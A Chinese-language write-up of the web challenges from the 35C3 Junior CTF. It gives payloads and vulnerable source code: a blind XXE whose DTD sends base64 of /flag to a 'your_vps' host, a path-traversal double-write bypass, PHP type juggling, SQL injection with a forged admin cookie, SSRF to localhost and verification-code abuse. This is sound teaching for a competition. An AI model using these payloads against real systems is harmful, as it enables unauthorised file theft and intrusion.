# 35C3 Junior CTF WEB题解

阅读量 **410955**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-02 15:30:49

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01e6becf6ecaad9ff1.png)

35C3CTF打不动，只好来做做Junior级别的了。

## blind

hint：Flag is at /flag

源码

    
    
     <?php
      function __autoload($cls) {
        include $cls;
      }
    
      class Black {
        public function __construct($string, $default, $keyword, $store) {
          if ($string) ini_set("highlight.string", "#0d0d0d");
          if ($default) ini_set("highlight.default", "#0d0d0d");
          if ($keyword) ini_set("highlight.keyword", "#0d0d0d");
    
          if ($store) {
                setcookie('theme', "Black-".$string."-".$default."-".$keyword, 0, '/');
          }
        }
      }
    
      class Green {
        public function __construct($string, $default, $keyword, $store) {
          if ($string) ini_set("highlight.string", "#00fb00");
          if ($default) ini_set("highlight.default", "#00fb00");
          if ($keyword) ini_set("highlight.keyword", "#00fb00");
    
          if ($store) {
                setcookie('theme', "Green-".$string."-".$default."-".$keyword, 0, '/');
          }
        }
      }
    
      if ($_=@$_GET['theme']) {
        if (in_array($_, ["Black", "Green"])) {
          if (@class_exists($_)) {
            ($string = @$_GET['string']) || $string = false;
            ($default = @$_GET['default']) || $default = false;
            ($keyword = @$_GET['keyword']) || $keyword = false;
    
            new $_($string, $default, $keyword, @$_GET['store']);
          }
        }
      } else if ($_=@$_COOKIE['theme']) {
        $args = explode('-', $_);
        if (class_exists($args[0])) {
          new $args[0]($args[1], $args[2], $args[3], '');
        }
      } else if ($_=@$_GET['info']) {
        phpinfo();
      }
    
      highlight_file(__FILE__);
    

可以看到在根据cookie加载主题类的地方没有判断cookie是否被篡改，导致我们可以实例化任意类`new $args[0]($args[1],
$args[2], $args[3], '');`。

本以为可以通过魔术方法`__autoload`来本地包含flag。可是翻阅官方文档发现：自PHP 7.2.0起，此功能已被弃用。

![](https://upload-images.jianshu.io/upload_images/9113969-50c2f1d3ba61283a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

通过预留的phpinfo可知题目环境为php7.2。

所以我们只好去寻找内置的php原生类，且该类的实例化参数要与`$args[0]($args[1], $args[2], $args[3], '')`相对应。

后来发现类`SimpleXMLElement`符合上述要求。

![](https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

该类的构造函数官方文档

![](https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

因此我们可以通过`Blind XXE`读取`/flag`文件

构造exp放到我们的vps上

xxe.xml

    
    
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
    <!ENTITY % remote SYSTEM "http://your_vps/test.dtd">
    %remote;
    %all;
    ]>
    <root>&send;</root>
    

test.dtd

    
    
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://your_vps/1.php?file=%file;'>">
    

监听，然后curl

    
    
    curl -v --cookie "theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true" "http://35.207.132.47:82"
    

![](https://upload-images.jianshu.io/upload_images/9113969-9999ea5ba75a875e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

base64解码即可

![](https://upload-images.jianshu.io/upload_images/9113969-6812190b164a4013.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## collider

题目描述： **Your task is pretty simple: Upload two PDF files. The first should
contain the string “NO FLAG!” and the other one “GIVE FLAG!”, but both should
have the same MD5 hash!**

您的任务非常简单：上传两个PDF文件。 第一个应该包含字符串”NO FLAG！”另一个”GIVE FLAG！”，但两者都应该有相同的MD5哈希！

源代码中提示`My source is at /src.tgz`，下载下来

主要代码

    
    
    <?php
        include_once "config.php";
        if(isset($_POST['submit']))  {
                $pdf1 = $_FILES['pdf1']['tmp_name'];
                $pdf2 = $_FILES['pdf2']['tmp_name'];
    
                if(! strstr(shell_exec("pdftotext $pdf1 - | head -n 1 | grep -oP '^NO FLAG!$'"), "NO FLAG!")) {
                    die("The first pdf does not contain 'NO FLAG!'");
                }
    
                if(! strstr(shell_exec("pdftotext $pdf2 - | head -n 1 | grep -oP '^GIVE FLAG!$'"), "GIVE FLAG!")) {
                    die("The second pdf does not contain 'GIVE FLAG!'");
                }
    
                if(md5_file($pdf1) != md5_file($pdf2)) {
                    die("The MD5 hashes do not match!");
                }
    
                echo "$FLAG";
    
        }
    ?>
    

哈希碰撞，工具地址：<https://github.com/cr-marcstevens/hashclash>

## flags

hint：Flag is at /flag

源码

    
    
    <?php
      highlight_file(__FILE__);
      $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
      $lang = explode(',', $lang)[0];
      $lang = str_replace('../', '', $lang);
      $c = file_get_contents("flags/$lang");
      if (!$c) $c = file_get_contents("flags/ot");
      echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';
    

`$_SERVER['HTTP_ACCEPT_LANGUAGE']`注入

![](https://upload-images.jianshu.io/upload_images/9113969-2d3b86a7f0530f7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

`../`被替换为空，可以双写绕过。

payload：`..././..././..././..././..././..././..././flag`

![](https://upload-images.jianshu.io/upload_images/9113969-c4861c16767298d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

base64解码

![](https://upload-images.jianshu.io/upload_images/9113969-d354667a4fee7ec0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## McDonald

题目描述：`Our web admin name's "Mc Donald" and he likes apples and always forgets
to throw away his apple cores...`

robots.txt中发现`Disallow: /backup/.DS_Store`

使用`.DS_Store`文件泄漏利用脚本

![](https://upload-images.jianshu.io/upload_images/9113969-37898f57af6102ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

找到flag

![](https://upload-images.jianshu.io/upload_images/9113969-36004d2416187a9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## Not(e) accessible

网页源码中提示`My source is at /src.tgz`。

关键源码

app.rb

    
    
    require 'sinatra'
    set :bind, '0.0.0.0'
    
    get '/get/:id' do
        File.read("./notes/#{params['id']}.note")
    end
    
    get '/store/:id/:note' do 
        File.write("./notes/#{params['id']}.note", params['note'])
        puts "OK"
    end 
    
    get '/admin' do
        File.read("flag.txt")
    end
    

index.php

    
    
    <?php
        require_once "config.php";
    
        if(isset($_POST['submit']) && isset($_POST['note']) && $_POST['note']!="") {
            $note = $_POST['note'];
    
            if(strlen($note) > 1000) {
                die("ERROR! - Text too long");
            }
    
            if(!preg_match("/^[a-zA-Z]+$/", $note)) {
                die("ERROR! - Text does not match /^[a-zA-Z]+$/");
            }
    
            $id = random_int(PHP_INT_MIN, PHP_INT_MAX);
            $pw = md5($note);
    
            # Save password so that we can check it later
            file_put_contents("./pws/$id.pw", $pw); 
    
            file_get_contents($BACKEND . "store/" . $id . "/" . $note);
    
            echo '<div class="shadow-sm p-3 mb-5 bg-white rounded">';
                echo "<p>Your note ID is $id<br>";
                echo "Your note PW is $pw</p>";
    
                echo "<a href='/view.php?id=$id&pw=$pw'>Click here to view your note!</a>";
            echo '</div>';
        }
    ?>
    

view.php

    
    
    <?php header("Content-Type: text/plain"); ?>
    <?php 
        require_once "config.php";
        if(isset($_GET['id']) && isset($_GET['pw'])) {
            $id = $_GET['id'];
            if(file_exists("./pws/" . (int) $id . ".pw")) {
                if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
                    echo file_get_contents($BACKEND . "get/" . $id);
                } else {
                    die("ERROR!");
                }
            } else {
                die("ERROR!");
            }
        }
    ?>
    

由`app.rb`可知，访问`/admin/`可以拿到`flag.txt`

`id`为随机数，`pw`为所填内容的md5值。

且在读取文件内容时，`id`没有被强制转换为`int`，所以我们可以构造注入进行任意文件读取。

![](https://upload-images.jianshu.io/upload_images/9113969-a1e92feb5e770049.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

但是还需要满足两个if条件。我们知道`(int)`转换时，会转换字符串开头的所有数字，丢弃掉数字后的非数字内容。

![](https://upload-images.jianshu.io/upload_images/9113969-99afab0946eb5467.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

因此我们构造

`echo file_get_contents($BACKEND . "get/your_id/../../admin);`即可读到flag。

不过复现的时候题目环境坏了，读不到了。

## saltfish

源码

    
    
    <?php
      require_once('flag.php');
      if ($_ = @$_GET['pass']) {
        $ua = $_SERVER['HTTP_USER_AGENT'];
        if (md5($_) + $_[0] == md5($ua)) {
          if ($_[0] == md5($_[0] . $flag)[0]) {
            echo $flag;
          }
        }
      } else {
        highlight_file(__FILE__);
      }
    

`$_`和`$_ua`都可控。我们需要满足两个if条件。

第一个if条件，我们可以令`$_`为数组，此时`md5($_)`会返回NULL，然后令`$_[0]`以字母开头，两者相加会返回0，接着由于是若比较，我们可以令`md5($ua)`以0e开头，`0e==0`会返回True。

又因为第二个if条件`$_[0]`与`md5($_[0] . $flag)`的第一个字符比较，我们令上述的`$_[0]`为一个md5范围的字母进行爆破即可。

![](https://upload-images.jianshu.io/upload_images/9113969-69e404f8cd09c78c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](https://upload-images.jianshu.io/upload_images/9113969-6af7a4b85a5cb361.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## DB Secret

题目描述 To enable secure microservices (or whatever, we don’t know yet) over Wee
in the future, we created a specific DB_SECRET, only known to us. This token
is super important and extremely secret, hence the name. The only way an
attacker could get hold of it is to serve good booze to the admins. Pretty
sure it’s otherwise well protected on our secure server.

提示源码：`/pyserver/server.py`

漏洞代码

    
    
    @app.route("/api/getprojectsadmin", methods=["POST"])
    def getprojectsadmin():
        # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);
        # ctx.json(paperbots.getProjectsAdmin(ctx.cookie("token"), request.sorting, request.dateOffset));
        name = request.cookies["name"]
        token = request.cookies["token"]
        user, username, email, usertype = user_by_token(token)
    
        json = request.get_json(force=True)
        offset = json["offset"]
        sorting = json["sorting"]
    
        if name != "admin":
            raise Exception("InvalidUserName")
    
        sortings = {
            "newest": "created DESC",
            "oldest": "created ASC",
            "lastmodified": "lastModified DESC"
        }
        sql_sorting = sortings[sorting]
    
        if not offset:
            offset = datetime.datetime.now()
    
        return jsonify_projects(query_db(
            "SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created < '{}' "
            "ORDER BY {} LIMIT 10".format(offset, sql_sorting), one=False), username, "admin")
    

json数据没有经过过滤被直接拼接进sql语句中，因此存在sql注入。

但是还要绕过`if name != "admin":`，name从cookie中直接获取，因此我们登陆后，把cookie中的name改成admin即可。

![](https://upload-images.jianshu.io/upload_images/9113969-adb028db7027613b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## Localhost

题目描述 We came up with some ingenious solutions to the problem of password
reuse. For users, we don’t use password auth but send around mails instead.
This works well for humans but not for robots. To make test automation
possible, we didn’t want to send those mails all the time, so instead we
introduced the localhost header. If we send a request to our server from the
same host, our state-of-the-art python server sets the localhost header to a
secret only known to the server. This is bullet-proof, luckily.

提示源码：`/pyserver/server.py`

搜索localhost可以找到

![](https://upload-images.jianshu.io/upload_images/9113969-2b7c3df88076baf2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

after_request: 每一个请求之后绑定一个函数

由于使用了`remote_addr`，因此我们无法伪造源ip，只能找一个ssrf的点。

发现`/api/proxyimage`存在ssrf。

    
    
    @app.route("/api/proxyimage", methods=["GET"])
    def proxyimage():
        url = request.args.get("url", '')
        parsed = parse.urlparse(url, "http")  # type: parse.ParseResult
        if not parsed.netloc:
            parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult
        url = parsed.geturl()
    
        resp = requests.get(url)
        if not resp.headers["Content-Type"].startswith("image/"):
            raise Exception("Not a valid image")
    
        # See https://stackoverflow.com/a/36601467/1345238
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        headers = [(name, value) for (name, value) in resp.raw.headers.items()
                   if name.lower() not in excluded_headers]
    
        response = Response(resp.content, resp.status_code, headers)
        return response
    

但是限制了请求头种的`content-type`必须为`image/`开头。

我们可以ssrf其主页上的图片。

![](https://upload-images.jianshu.io/upload_images/9113969-03f3187072cf999d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

payload

    
    
    curl -v http://35.207.132.47/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg
    

![](https://upload-images.jianshu.io/upload_images/9113969-6f7853a7966a9b47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## Logged In

题目描述:Phew, we totally did not set up our mail server yet. This is bad news
since nobody can get into their accounts at the moment… It’ll be in our next
sprint. Until then, since you cannot login: enjoy our totally finished
software without account.

意思就是没有邮件服务器，你无法登陆。所以我们想办法登陆进去即可。

提示 源码`/pyserver/server.py`

关键源码

    
    
    @app.route("/api/signup", methods=["POST"])
    def signup():
        usertype = "user"
        json = request.get_json(force=True)
        name = escape(json["name"].strip())
        email = json["email"].strip()
        if len(name) == 0:
            raise Exception("InvalidUserName")
        if len(email) == 0:
            raise Exception("InvalidEmailAddress")
        if not len(email.split("@")) == 2:
            raise Exception("InvalidEmailAddress")
        email = escape(email.strip())
        # Make sure the user name is 4-25 letters/digits only.
        if len(name) < 4 or len(name) > 25:
            raise Exception("InvalidUserName")
    
        if not all([x in string.ascii_letters or x in string.digits for x in name]):
            raise Exception("InvalidUserName")
        # Check if name exists
        if query_db("SELECT name FROM users WHERE name=?", name):
            raise Exception("UserExists")
        if query_db("Select id, name FROM users WHERE email=?", email):
            raise Exception("EmailExists")
        # Insert user // TODO: implement the verification email
        db = get_db()
        c = db.cursor()
        c.execute("INSERT INTO users(name, email, type) values(?, ?, ?)", (name, email, usertype))
        db.commit()
        return jsonify({"success": True})
    
    
    @app.route("/api/login", methods=["POST"])
    def login():
        print("Logging in?")
        # TODO Send Mail
        json = request.get_json(force=True)
        login = json["email"].strip()
        try:
            userid, name, email = query_db("SELECT id, name, email FROM users WHERE email=? OR name=?", (login, login))
        except Exception as ex:
            raise Exception("UserDoesNotExist")
        return get_code(name)
    
    
    @app.route("/api/verify", methods=["POST"])
    def verify():
        code = request.get_json(force=True)["code"].strip()
        if not code:
            raise Exception("CouldNotVerifyCode")
        userid, = query_db("SELECT userId FROM userCodes WHERE code=?", code)
        db = get_db()
        c = db.cursor()
        c.execute("DELETE FROM userCodes WHERE userId=?", (userid,))
        token = random_code(32)
        c.execute("INSERT INTO userTokens (userId, token) values(?,?)", (userid, token))
        db.commit()
        name, = query_db("SELECT name FROM users WHERE id=?", (userid,))
        resp = make_response()
        resp.set_cookie("token", token, max_age=2 ** 31 - 1)
        resp.set_cookie("name", name, max_age=2 ** 31 - 1)
        resp.set_cookie("logged_in", LOGGED_IN)
        return resp
    

根据源码可知，`code`是随机生成后存在数据库里的。

login最后会调用`get_code`随机生成`code`后插入数据库中，并返回`code`的值。

![](https://upload-images.jianshu.io/upload_images/9113969-ea4046f6902108f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](https://upload-images.jianshu.io/upload_images/9113969-b204eecb67afc3b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

我们可以先`login`随机生成`code`插入数据库，得到插入的`code`值，然后调用`/api/verify`即可。

随便注册一个名字为：qweraaasa，login查看返回包。

![](https://upload-images.jianshu.io/upload_images/9113969-5a35a699a3bd3493.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

调用`/api/verify`验证

![](https://upload-images.jianshu.io/upload_images/9113969-59b6eba2359a6855.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Smi1e** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/168987](/post/id/168987)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)

 **+1** __12赞

 __收藏

![](https://p5.ssl.qhimg.com/t010d9349529890bcdc.png) Smi1e

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

